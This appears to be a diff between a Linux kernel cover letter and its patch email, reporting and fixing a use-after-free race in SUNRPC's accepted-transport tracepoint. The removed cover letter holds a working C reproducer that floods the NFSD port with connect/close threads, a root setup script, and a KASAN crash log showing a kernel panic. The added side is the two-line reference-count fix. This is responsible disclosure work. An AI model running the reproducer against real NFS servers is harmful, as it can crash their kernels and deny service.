@@ -1,62 +1,64 @@
-Received: from mail-pf1-f172.google.com (mail-pf1-f172.google.com [209.85.210.172])
+Received: from mail-pl1-f179.google.com (mail-pl1-f179.google.com [209.85.214.179])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E08783290C7
-	for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 13:56:23 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.172
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9F7E4346A0A
+	for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 13:56:28 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.179
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789221385; cv=none; b=jhr86x/FW56C8NI6UZh4HqIItJTSQGsDZ9wm8ztUs/QARiFf05GxWAwKb9ySRcnhpCnPUDfctr5Rdn2S7nnK5DUz4EIf7/VSKS/sfP11uG1Q0PY5/z0kmGJid7MhxQKDd/8EharI+ciNlxtI8hRX5rnKXtSi91xZgnoNbA2kDkM=
+	t=1789221389; cv=none; b=NqpuulanxnxeVAMOAxU9YwKpNEzeRIPgXweTM8DGVfBD6ibWS40LfOTC+LOQA6uLiGTtP0Pz0VKN8xmrh5fgoh6r31Hh/UUV31D31Jn2sYDUMRirNBm0tNCkOXLdvfawTmZKlrjEwKkrZIKjXOrToqHO3xYXAC4jvFtq45RPtuA=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789221385; c=relaxed/simple;
-	bh=3Zmgdw0QDt5Fg7eG1DHFlfLM0BG26coxDtoMF6t7tKY=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=uSry4CnOTmG2KZgmTMPyu53dEOIyA1gjVngMqYaqGwR6SiQ1GVVeB4rTYgJhTjCNHNXs41jGTPM0OOosnfzU9KULI9yMi1hq2U7REJb6GqaczvLQ31oOvj/gtCSIs+EyB1Ht0GT9y/pwA+13xXLy894pPZWu+tyW3ZQgn43eqZk=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=HUmyHQXp; arc=none smtp.client-ip=209.85.210.172
+	s=arc-20240116; t=1789221389; c=relaxed/simple;
+	bh=r4qr1atOhqzJgVEOo1uT7xsHaD3qDrrY/KwK5TvOYyk=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=YCiT/TOUEQYUg+W/BzSqdTwiff5+nXetmIkEH/HqvczmaM5G4I/RmJMB+P7E11/1DesfCfnovCCyJSWW7/j4NFB/iWRRXMADbNpdiW7uQly0uYgskSKG9FgPnSrFx5PgnGgwtFxg1A02Dg9iK4vVOBx7cDBJub6QbKFNMXvllTs=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=kOcOcjPx; arc=none smtp.client-ip=209.85.214.179
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="HUmyHQXp"
-Received: by mail-pf1-f172.google.com with SMTP id d2e1a72fcca58-869d181419bso1796694b3a.2
-        for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 06:56:23 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="kOcOcjPx"
+Received: by mail-pl1-f179.google.com with SMTP id d9443c01a7336-2d6e954afbdso14336135ad.2
+        for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 06:56:28 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1789221383; x=1789826183; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=ltE8hmOwdxEerL1lVsOCisOm4JARkEhCGeOYU3e883U=;
-        b=HUmyHQXp6q5Oe6Z95iqXKARhUJcainnBK9q9sJpvpNnoEjS8dYKZ/3cqlOGzufkgEj
-         nUPfGrG3dGr70E8jPeitEQJ17xnHhBNeG3WEdjCxVjJsaY1Wa3gTL2FxULdQ1T5rfa88
-         kUc3QGCkc6uhefoUKC82JB+XlmQAkNo1Gu4f0yE8dKrozSRGn23U2IpM8xebAoZXOvHQ
-         R0gmxrfCJ1PTyXtkYfS7xNNy11E9iM/7yUauS3dxPEaVN/OByz6R5hjPRAa5k2Z5l9r9
-         bEjzKC1UsmTL71oNKkIC3oU/7548d2gq0dOD/1xhiXaJ6nyE0I/eJ3nT5ba6iTcjs3Kt
-         vi5A==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1789221383; x=1789826183;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1789221388; x=1789826188; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=ltE8hmOwdxEerL1lVsOCisOm4JARkEhCGeOYU3e883U=;
-        b=L/1Dtk3NqAWtEuSvGwjtFy9+y6upwc24dVlbNo59EriswSAS5TXuZKocCs/fxEH+Kv
-         JERjpCzam/xMQ86yoh6PGyUIP3MOcZi1GdSFiUeHL63vxKt5eI7YVU1C+yrZ5rplhpAL
-         m4qNUqd4r52FFiPwa7pJcgAQ7v3GldWge8vvqEogjm9kUfn6d1I6903ittIpa8OA4hVN
-         WQ7aj/aDShszzvZToEO11zfVLGp14VDB31/1MIRXx76qjjtiXnh34xMj7PnsMcWvzAvL
-         T73cpT8oEHYwak5C52nkiyyp/kMr3T7ARQd5HORO5GR4Af8W61BvGAj1iuBGDDYwdhz2
-         JLjw==
-X-Forwarded-Encrypted: i=1; AKwUvByIfzBpX1DWDbpumV12lWY/AcovWNy8Ss8a8pVIu0YCDaXxbusRIvvl7LxRoVlXvxo+k8/rEMk=@vger.kernel.org
-X-Gm-Message-State: AFuF++mokq3vbIfRA13QxbMPEvCWePY5GICA6RnGWYsTnTKZZzGawNfF
-	fNK/XmZ3L6HOm1NOSLWYRvH34GKm5arZ0hz/Lw4VYaoFB+QDDwdoY10BAcE4lS+e8yX/
-X-Gm-Gg: AYBFou3tOIzUxn9wrRrtSNxOw+bwJxypWRe7jWRSYYBI81gjmgvnxzfGCmuETk9CfQL
-	qELLAvvoB3BLjHz8HNqFe3AIdY2rYQSBG5dpy3dPh3IgomoYlPMYy1a4FdbCwhIagZ81zeZz+YZ
-	s3jP0DHnaVTWFGycMLzQI74Kx6eV/DVPNDXyHWJo9naxLNEuTsxTBJfMzWKgP3lCfUVrnpoK6Dw
-	iNore5wa/JyBSs2dkymfWlIdDeVIpNwmXYImd1sQdmV6GMAv2opT8XbzmTDq4BHJRWpwnWJmLfw
-	6tqlEN7q1efc9KQIyR4hhmpBZTow3hMkAMtDI4NtBcNCHUpMKcRespHJj0jmkxV9ma5tg58JuGq
-	kgt6mrVXbGfbXee96n2UOWVT+dkhokxrp+IXaUPjNVTmkQhcvaEP+Doc7R0rrAeYCysqhj0wN4S
-	WkIuwDCyAGKuaH3rlPgKxjReKAfPSpRTxMcReH1Uk4lfi98F3wgzdxVHrI25uvmRwJRrQBijq+Y
-	z7rqFI=
-X-Received: by 2002:a05:6a21:8cc4:b0:3cc:92d9:80cb with SMTP id adf61e73a8af0-3daed4edf77mr17451958637.12.1789221383106;
-        Sat, 12 Sep 2026 06:56:23 -0700 (PDT)
+        bh=z8PisNlwgdN5z8oDrbfsU7/ISYrUrPGO/VaKKGw0ObA=;
+        b=kOcOcjPx/ZeLEKNNSDRVp6GB7/jn9JbSi9KSqVRbeHVUtwc1s/ir/T2rYngf3iXpYK
+         X1OAR1vct2zntnVmdP9ojVX/Liuast9YncwylLiyx6+5RzOl1zdMZjlx+cLbYHjKSQCg
+         +y4MtXBKoCUuCQMy7eiL7vnQuIQbVngYkfWHSiRirv6J/RvFvRudc5NFxdP58xMUoco+
+         Sbajo/SdKX0nYUX4ntCH8g85A9+CTi90CdYCQbGRj3hHpB25ua9OUPaJA6dxhQ9A0C27
+         g1MMGcrqtCwgETbxgmXw6F5LDsT3RG73Obg1keQuih57K8L9RWXHUGaYYOi6ScLRfZcq
+         FM2w==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1789221388; x=1789826188;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=z8PisNlwgdN5z8oDrbfsU7/ISYrUrPGO/VaKKGw0ObA=;
+        b=oJIbRQwHrtG6bC8frv1qr7Uk7geUJ0uh6n/CypfylerF2AH/BCCQIawsDfDBejJb+W
+         M0yNHHIu4LKGt+u4b08VX9f+vGYP10ktZL3SYaLoOo8s6ZdtLD9PcgZp79RkuW/xSlmr
+         X6MB5obRmIASdZ3vXEioWGHBKR6iwPKt4Rl6m4ZQ/r9Yr6u+H/JSWgjORjSAzrkZSS+W
+         5OMEQ84/AIxW+QGfxcR+TqVhOOxIUi+1FW2NLaWsthn3JERLMwrwE+WB7xiA/eVhLSTC
+         k+Jn6c3TQE9YYtSPWfeznJhgC3ZYFwca+1+JVh+uE8uDdiAmSC9Z5Lt7UhNLQ2ZrdxCg
+         JrDw==
+X-Forwarded-Encrypted: i=1; AKwUvBwf4qN0rVs/hnX6WOUKbdnUCZ5AyeaRXvEASRf8UB/GTCjFlHmZnH4kbBSJ5urgKd81xKejmG0=@vger.kernel.org
+X-Gm-Message-State: AFuF++mtgcU20AQe5owiUlqFWqUPU4C+rcs5lehZX4Z3ZD/mQTpUyTSY
+	so3r7wPrMr4AU4LZSnILuwBORUDRlIDKImYMTSiJ8HaSNkY22Jhukep6sEizvC+/pZlp
+X-Gm-Gg: AYBFou0lAgyXmAiQG5Duja0j75R2kXiVywlfyxkR+uHwNg6ZaFIVdjlqXa/OBLZeLc6
+	w4ORKA6ZvkqIUt+2XiSjknFZ8687+hnKBri51CUwWthLYB0z9wgThz/qRs9QRnACzlNJTC24L8s
+	ZxBkWA8nbnb1w2r7CoR0fRFxwjUJkf6/uZCLY2/tc72l3M7QolvNfmSK2+kMovN0R+vVOkL4rLl
+	zLxzYcTWiYIz2j/wOR4UWf1flYAnVYMGj43aO8OArk8ZZba+QG2p7B9p4jmd8rah5Cylm+iggX/
+	RO9yh4gz5JdtYRf6vvyFUK2nFyYF/pDrk/odpwnXzrxhRjQWSi24eIpGDQgv/Z2sIdjzYFWDLMq
+	obuZ6oo40fU/4eKufRP4T6ti9pnxmB8XBH66M08XgIYkdU/k9jmN+qlD6e2XBBPLHpBnF1sq+cO
+	YO+PIQTO0Gwe9dr3qDxfIL/RgBH7LV87eElmxdEyxiSa02tuT4pa3IFz9ftYee2gxjlwE1h8JXh
+	1r3VqQ=
+X-Received: by 2002:a17:903:178e:b0:2cf:b68a:340 with SMTP id d9443c01a7336-2dd2a336572mr174031925ad.10.1789221388042;
+        Sat, 12 Sep 2026 06:56:28 -0700 (PDT)
 Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-33ba4f1e434sm13947833eec.22.2026.09.12.06.56.18
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-33ba4f1e434sm13947833eec.22.2026.09.12.06.56.23
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 12 Sep 2026 06:56:22 -0700 (PDT)
+        Sat, 12 Sep 2026 06:56:27 -0700 (PDT)
 From: Zhiling Zou <zhilinz@nebusec.ai>
 To: linux-nfs@vger.kernel.org,
 	netdev@vger.kernel.org
@@ -74,10 +76,12 @@ Cc: trondmy@kernel.org,
 	horms@kernel.org,
 	vega@nebusec.ai,
 	zhilinz@nebusec.ai
-Subject: [PATCH net 0/1] SUNRPC: hold a reference while tracing accepted transports
-Date: Sat, 12 Sep 2026 21:56:08 +0800
-Message-ID: <cover.1789220778.git.zhilinz@nebusec.ai>
+Subject: [PATCH net 1/1] SUNRPC: hold a reference while tracing accepted transports
+Date: Sat, 12 Sep 2026 21:56:09 +0800
+Message-ID: <d15495bff2247e3f9d4f9ef36df8e246a3898380.1789220778.git.zhilinz@nebusec.ai>
 X-Mailer: git-send-email 2.43.0
+In-Reply-To: <cover.1789220778.git.zhilinz@nebusec.ai>
+References: <cover.1789220778.git.zhilinz@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -86,250 +90,37 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
+svc_handle_xprt() publishes a newly accepted transport before tracing it.
+The publication can make the transport available to another worker, which
+may close and free it before the tracepoint has finished reading it.
 
-We found and validated an issue in net/sunrpc/svc_xprt.c. The bug is
-reachable by a root user through the NFSD listener and TCP connect path.
-We've tested it, and it should not affect any other functionality.
+Take an extra reference before publication and drop it after the tracepoint
+so the accepted transport remains alive for the tracepoint dereferences.
 
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
-
----- details below ----
-
-Bug details:
-
-svc_handle_xprt() publishes a newly accepted transport with
-svc_add_new_temp_xprt() before calling trace_svc_xprt_accept(). Publishing
-the transport clears XPT_BUSY and allows another service worker to close
-and free it immediately.
-
-The tracepoint then dereferences the accepted transport without holding a
-reference. A concurrent connect-and-close sequence can therefore make the
-tracepoint read freed transport fields, including the addresses, flags,
-class, and network namespace.
-
-The fix takes an extra reference before publishing the transport and
-releases it after trace_svc_xprt_accept() returns.
-
-Reproducer:
-
-    make
-    sh ./poc.sh
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-
-    #define _GNU_SOURCE
-    #include <arpa/inet.h>
-    #include <errno.h>
-    #include <netinet/in.h>
-    #include <pthread.h>
-    #include <signal.h>
-    #include <stdatomic.h>
-    #include <stdbool.h>
-    #include <stdint.h>
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <string.h>
-    #include <sys/socket.h>
-    #include <sys/time.h>
-    #include <sys/types.h>
-    #include <time.h>
-    #include <unistd.h>
-
-    static atomic_bool stop_flag = false;
-    static atomic_ulong attempts = 0;
-    static atomic_ulong connects = 0;
-    static atomic_ulong errs = 0;
-
-    struct worker_args {
-    	struct sockaddr_in addr;
-    };
-
-    static void on_signal(int sig)
-    {
-    	(void)sig;
-    	atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
-    }
-
-    static void *worker(void *arg)
-    {
-    	struct worker_args *w = arg;
-    	struct linger ling = {
-    		.l_onoff = 1,
-    		.l_linger = 0,
-    	};
-
-    	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
-    		int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
-    		if (fd < 0) {
-    			atomic_fetch_add_explicit(&errs, 1, memory_order_relaxed);
-    			continue;
-    		}
-
-    		setsockopt(fd, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
-    		atomic_fetch_add_explicit(&attempts, 1, memory_order_relaxed);
-    		if (connect(fd, (struct sockaddr *)&w->addr, sizeof(w->addr)) == 0)
-    			atomic_fetch_add_explicit(&connects, 1, memory_order_relaxed);
-    		else if (errno != ECONNREFUSED && errno != ECONNRESET &&
-    			 errno != ETIMEDOUT && errno != EHOSTUNREACH &&
-    			 errno != ENETUNREACH)
-    			atomic_fetch_add_explicit(&errs, 1, memory_order_relaxed);
-
-    		close(fd);
-    	}
-
-    	return NULL;
-    }
-
-    int main(int argc, char **argv)
-    {
-    	struct worker_args args = {
-    		.addr = {
-    			.sin_family = AF_INET,
-    			.sin_port = htons(2049),
-    		},
-    	};
-    	pthread_t *threads;
-    	unsigned int nthreads = 64;
-    	unsigned int seconds = 0;
-    	time_t start = time(NULL);
-
-    	if (argc > 1)
-    		nthreads = strtoul(argv[1], NULL, 0);
-    	if (argc > 2)
-    		seconds = strtoul(argv[2], NULL, 0);
-    	if (argc > 3 && inet_pton(AF_INET, argv[3], &args.addr.sin_addr) != 1) {
-    		fprintf(stderr, "bad IPv4 address: %s\n", argv[3]);
-    		return 1;
-    	}
-    	if (argc <= 3)
-    		inet_pton(AF_INET, "127.0.0.1", &args.addr.sin_addr);
-
-    	signal(SIGINT, on_signal);
-    	signal(SIGTERM, on_signal);
-
-    	threads = calloc(nthreads, sizeof(*threads));
-    	if (!threads) {
-    		perror("calloc");
-    		return 1;
-    	}
-
-    	for (unsigned int i = 0; i < nthreads; i++) {
-    		if (pthread_create(&threads[i], NULL, worker, &args) != 0) {
-    			perror("pthread_create");
-    			atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
-    			nthreads = i;
-    			break;
-    		}
-    	}
-
-    	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
-    		sleep(1);
-    		fprintf(stderr,
-    			"elapsed=%lds attempts=%lu connects=%lu errs=%lu\n",
-    			(long)(time(NULL) - start),
-    			atomic_load_explicit(&attempts, memory_order_relaxed),
-    			atomic_load_explicit(&connects, memory_order_relaxed),
-    			atomic_load_explicit(&errs, memory_order_relaxed));
-    		if (seconds && (unsigned int)(time(NULL) - start) >= seconds)
-    			atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
-    	}
-
-    	for (unsigned int i = 0; i < nthreads; i++)
-    		pthread_join(threads[i], NULL);
-    	free(threads);
-    	return 0;
-    }
-
-------END poc.c--------
-
-------BEGIN poc.sh------
-
-    #!/bin/sh
-    set -eu
-
-    cd "$(dirname "$0")"
-
-    mountpoint -q /proc/fs/nfsd || mount -t nfsd nfsd /proc/fs/nfsd
-    printf -- "-3 +4 +4.1 +4.2\n" > /proc/fs/nfsd/versions
-    printf "tcp 2049\n" > /proc/fs/nfsd/portlist
-    printf "8\n" > /proc/fs/nfsd/threads
-    printf "0" > /proc/sys/kernel/panic_on_warn
-    printf "1" > /sys/kernel/tracing/events/sunrpc/svc_xprt_accept/enable
-
-    exec ./poc 128 180
-
-------END poc.sh--------
-
-----BEGIN crash log----
-
-[  333.976492][ T1246] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
-[  333.977355][ T1246] KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
-[  333.977921][ T1246] CPU: 0 UID: 0 PID: 1246 Comm: nfsd Tainted: G    B              6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
-[  333.978690][ T1246] Tainted: [B]=BAD_PAGE
-[  333.978970][ T1246] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  333.979739][ T1246] RIP: 0010:trace_event_get_offsets_svc_xprt_accept+0x101/0x2e0
-[  333.980242][ T1246] Code: 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 c3 01 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 75 00 4c 89 f2 48 c1 ea 03 <80> 3c 02 00 0f 85 b1 01 00 00 49 8b 3e 48 c7 c0 40 ff 11 87 45 8d
-[  333.981476][ T1246] RSP: 0018:ffffc90003487c98 EFLAGS: 00010256
-[  333.981879][ T1246] RAX: dffffc0000000000 RBX: ffffc90003487d70 RCX: 0000000000000000
-[  333.982391][ T1246] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffffc90003487c60
-[  333.982899][ T1246] RBP: ffff88810948c000 R08: 0000000000000001 R09: fffffbfff162a4dc
-[  333.983401][ T1246] R10: ffffffff8b1526e7 R11: ffffffff8868e950 R12: 0000000000000020
-[  333.983948][ T1246] R13: ffffffff8696cb80 R14: 0000000000000000 R15: 0000000000100034
-[  333.984458][ T1246] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
-[  333.985059][ T1246] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[  333.985486][ T1246] CR2: 00007c23a67c3f78 CR3: 0000000109790003 CR4: 0000000000770ef0
-[  333.986017][ T1246] PKRU: 55555554
-[  333.986254][ T1246] Call Trace:
-[  333.986469][ T1246]  <TASK>
-[  333.986668][ T1246]  do_trace_event_raw_event_svc_xprt_accept+0xce/0x5d0
-[  333.987112][ T1246]  ? __pfx_do_trace_event_raw_event_svc_xprt_accept+0x10/0x10
-[  333.987582][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  333.987949][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  333.988320][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  333.988686][ T1246]  ? kasan_quarantine_put+0xcc/0x1d0
-[  333.989350][ T1246]  svc_recv+0x1d74/0x2520
-[  333.989649][ T1246]  nfsd+0x2f1/0x440
-[  333.989900][ T1246]  ? __pfx_nfsd+0x10/0x10
-[  333.990185][ T1246]  kthread+0x2bd/0x3a0
-[  333.990451][ T1246]  ? __pfx_kthread+0x10/0x10
-[  333.990750][ T1246]  ? __pfx_kthread+0x10/0x10
-[  333.991046][ T1246]  ret_from_fork+0x31/0x70
-[  333.991329][ T1246]  ? __pfx_kthread+0x10/0x10
-[  333.991632][ T1246]  ret_from_fork_asm+0x1a/0x30
-[  333.991958][ T1246]  </TASK>
-[  333.992156][ T1246] Modules linked in:
-[  333.992461][ T1246] ---[ end trace 0000000000000000 ]---
-[  333.992828][ T1246] RIP: 0010:trace_event_get_offsets_svc_xprt_accept+0x101/0x2e0
-[  333.993321][ T1246] Code: 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 c3 01 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 75 00 4c 89 f2 48 c1 ea 03 <80> 3c 02 00 0f 85 b1 01 00 00 49 8b 3e 48 c7 c0 40 ff 11 87 45 8d
-[  333.994585][ T1246] RSP: 0018:ffffc90003487c98 EFLAGS: 00010256
-[  333.994975][ T1246] RAX: dffffc0000000000 RBX: ffffc90003487d70 RCX: 0000000000000000
-[  333.995510][ T1246] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffffc90003487c60
-[  333.996041][ T1246] RBP: ffff88810948c000 R08: 0000000000000001 R09: fffffbfff162a4dc
-[  333.996546][ T1246] R10: ffffffff8b1526e7 R11: ffffffff8868e950 R12: 0000000000000020
-[  333.997104][ T1246] R13: ffffffff8696cb80 R14: 0000000000000000 R15: 0000000000100034
-[  333.997621][ T1246] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
-[  333.998216][ T1246] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[  333.998627][ T1246] CR2: 00007c23a67c3f78 CR3: 0000000109790003 CR4: 0000000000770ef0
-[  333.999145][ T1246] PKRU: 55555554
-[  333.999377][ T1246] Kernel panic - not syncing: Fatal exception
-[  333.999901][ T1246] Kernel Offset: disabled
-[  334.000176][ T1246] Rebooting in 10 seconds..
-
------END crash log-----
-
-Best regards,
-Zhiling Zou
-
-Zhiling Zou (1):
-  SUNRPC: hold a reference while tracing accepted transports
-
+Fixes: 11bbb0f76e99 ("SUNRPC: Trace a few more generic svc_xprt events")
+Cc: stable@vger.kernel.org
+Reported-by: VEGA <vega@nebusec.ai>
+Assisted-by: LLM
+Signed-off-by: Zhiling Zou <zhilinz@nebusec.ai>
+---
  net/sunrpc/svc_xprt.c | 2 ++
  1 file changed, 2 insertions(+)
 
+diff --git a/net/sunrpc/svc_xprt.c b/net/sunrpc/svc_xprt.c
+index 40040af588fb2..9370401463b6a 100644
+--- a/net/sunrpc/svc_xprt.c
++++ b/net/sunrpc/svc_xprt.c
+@@ -852,8 +852,10 @@ static void svc_handle_xprt(struct svc_rqst *rqstp, struct svc_xprt *xprt)
+ 		newxpt = xprt->xpt_ops->xpo_accept(xprt);
+ 		if (newxpt) {
+ 			newxpt->xpt_cred = get_cred(xprt->xpt_cred);
++			svc_xprt_get(newxpt);
+ 			svc_add_new_temp_xprt(serv, newxpt);
+ 			trace_svc_xprt_accept(newxpt, serv->sv_name);
++			svc_xprt_put(newxpt);
+ 		} else {
+ 			module_put(xprt->xpt_class->xcl_owner);
+ 		}
 -- 
 2.43.0
 
